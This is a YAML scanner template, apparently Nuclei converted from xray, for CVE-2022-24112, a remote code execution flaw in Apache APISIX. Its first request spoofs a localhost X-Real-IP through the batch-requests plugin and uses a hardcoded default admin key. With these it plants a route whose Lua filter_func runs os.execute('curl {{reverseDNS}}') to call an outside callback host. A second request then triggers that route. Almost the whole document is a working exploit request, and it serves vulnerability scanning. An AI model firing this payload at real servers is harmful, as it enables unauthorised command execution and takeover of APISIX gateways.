id: poc-yaml-apisix-dashboard-cve-2022-24112-rce

info:
  name: poc-yaml-apisix-dashboard-cve-2022-24112-rce
  author: Xz
  severity: critical
  tags: xray-converted,rce,cve-2022-24112,ct-386274
  reference:
    - https://www.openwall.com/lists/oss-security/2022/02/11/3
    - https://twitter.com/sirifu4k1/status/1496043663704858625
    - https://apisix.apache.org/zh/docs/apisix/plugins/batch-requests
    - https://nvd.nist.gov/vuln/detail/CVE-2022-24112

http:
  - raw:
      - |
        POST /apisix/batch-requests HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
        "headers":{
        "X-Real-IP":"127.0.0.1",
        "Content-Type":"application/json"
        },
        "timeout":1500,
        "pipeline":[
        {
        "method":"PUT",
        "path":"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1",
        "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/api/{{rand_base(8)}}\",\r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl {{reverseDNS}}'); return true end\"}"
        }
        ]
        }
        

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /api/{{rand_base(8)}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200